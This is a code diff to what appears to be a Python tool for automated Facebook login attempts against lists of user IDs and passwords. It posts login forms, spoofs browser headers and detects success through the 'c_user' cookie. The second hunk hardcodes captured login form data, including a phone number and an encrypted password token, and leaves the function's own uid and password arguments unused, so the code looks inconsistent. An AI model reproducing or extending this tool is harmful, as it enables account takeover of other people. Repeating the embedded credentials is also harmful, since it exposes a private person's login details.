@@ -1342,7 +1342,7 @@ def mbasic(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
             'viewport-width': '980',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1504,86 +1504,29 @@ def x(uid,pwx,tl):
             'type': 'action',
             '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
-    '__aaid': '0',
-    '__user': '0',
-    '__a': '1',
-    '__req': 'a',
-    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
-    'dpr': '3',
-    '__ccg': 'EXCELLENT',
-    '__rev': '1023608600',
-    '__s': ':f95eey:i9v0n0',
-    '__hsi': '7513185148771233093',
-    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
-    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'params': json.dumps({
-        "params": json.dumps({
-            "server_params": {
-                "credential_type": "password",
-                "username_text_input_id": "7w9omu:68",
-                "password_text_input_id": "7w9omu:69",
-                "login_source": "login",
-                "login_credential_type": "none",
-                "server_login_source": "login",
-                "ar_event_source": "login_home_page",
-                "should_trigger_override_login_success_action": 0,
-                "should_trigger_override_login_2fa_action": 0,
-                "is_caa_perf_enabled": 0,
-                "reg_flow_source": "login_home_native_integration_point",
-                "caller": "gslr",
-                "is_from_landing_page": 0,
-                "is_from_empty_password": 0,
-                "is_from_aymh": 0,
-                "is_from_password_entry_page": 0,
-                "is_from_assistive_id": 0,
-                "is_from_msplit_fallback": 0,
-                "two_step_login_type": "one_step_login",
-                "INTERNAL__latency_qpl_marker_id": 36707139,
-                "INTERNAL__latency_qpl_instance_id": "47746277400427",
-                "device_id": None,
-                "family_device_id": None,
-                "waterfall_id": "123dc61e-79b8-44ee-8c3d-6da87a95cea7",
-                "offline_experiment_group": None,
-                "layered_homepage_experiment_group": None,
-                "is_platform_login": 0,
-                "is_from_logged_in_switcher": 0,
-                "is_from_logged_out": 0,
-                "access_flow_version": "pre_mt_behavior"
-            },
-            "client_input_params": {
-                "machine_id": "",
-                "cloud_trust_token": None,
-                "contact_point": uid,
-                "password": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-                "accounts_list": [],
-                "fb_ig_device_id": [],
-                "secure_family_device_id": "",
-                "encrypted_msisdn": "",
-                "headers_infra_flow_id": "",
-                "try_num": 1,
-                "login_attempt_count": 1,
-                "event_flow": "login_manual",
-                "event_step": "home_page",
-                "openid_tokens": {},
-                "block_store_machine_id": "",
-                "auth_secure_device_id": "",
-                "client_known_key_hash": "",
-                "has_whatsapp_installed": 0,
-                "sso_token_map_json_string": "",
-                "should_show_nested_nta_from_aymh": 0,
-                "password_contains_non_ascii": "false",
-                "has_granted_read_contacts_permissions": 0,
-                "has_granted_read_phone_permissions": 0,
-                "app_manager_id": "",
-                "aymh_accounts": [],
-                "lois_settings": {
-                    "lois_token": ""
-                }
-            }
-        })
-    }),
+    'jazoest': '22174',
+    'lsd': 'AdR5JWFUwlS2L0rKCEc_O4MdQCc',
+    'display': '',
+    'isprivate': '',
+    'return_session': '',
+    'skip_api_login': '',
+    'signed_next': '',
+    'trynum': '1',
+    'timezone': '-330',
+    'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+    'lgnrnd': '030250_YqDq',
+    'lgnjs': '1783591371',
+    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc4MzU5MTM3MS45MjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3ODM1OTEzNzEuOTI0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3ODM1OTEzNzEuOTI0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3ODM1OTEzNzEuOTI0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzgzNTkxMzcxLjkyNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoxNTB9XSwiMzAwMDUiOlt7InQiOjE3ODM1OTEzNzEuOTI1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnsidyI6MTE4OSwiaCI6NzczfX1dLCIzMDAwNyI6W3sidCI6MTc4MzU5MTM3MS45MjUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzgzNTkxMzcxLjk4MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc4MzU5MTM3MS45MjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc4MzU5MTM3MS45MjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM5LjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzgzNTkxMzcxLjkyNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzgzNTkxMzcxLjkyNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzgzNTkxMzcxLjkzOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzgzNTkxMzcxLjkzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzgzNTkxMzcxLjkzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzgzNTkxMzcxLjkzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzOS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc4MzU5MTM3MS45MzksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6OX1dLCIzMDEwNiI6W3sidCI6MTc4MzU5MTM3MS44NjMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTc4MzU5MTM3Mi40OTMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc4MzU5MTM3MS44NjksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAxMDkiOlt7InQiOjE3ODM1OTEzNzIuMTE4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiI4YzFmMjc4YmU2NzdmYTI4OTUwNjFhNDVhNjg1ZDIzZDA2YjM1YmZkNzhhNjY2ODQ1MzZhMzg1YWQ1ZTM4ZmQ2In1dfQ==',
+    'email': '9641684611',
+    'prefill_contact_point': '9641684611|9641684611',
+    'prefill_source': 'browser_dropdown',
+    'prefill_type': 'password',
+    'first_prefill_source': 'browser_dropdown',
+    'first_prefill_type': 'contact_point',
+    'had_cp_prefilled': 'true',
+    'had_password_prefilled': 'true',
+    'ab_test_data': 'fAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAA/f/AABAAG',
+    'encpass': '#PWD_BROWSER:5:1783591473:AYdQAL5hnkKKURrz+Fo3PSM3w/RhS6fg791BU/yM9HYYL2INSuHcmXPcnwzMxvj67X3ERKyVceDpQqtAACR/59ipfczFvxIMDzLVkCrQpGE8C3RvpGVfBmdjFLFg3rNSfoWgnmVy90p2KQVacO8=',
 }
             headers = {
             'Host': 'm.facebook.com',
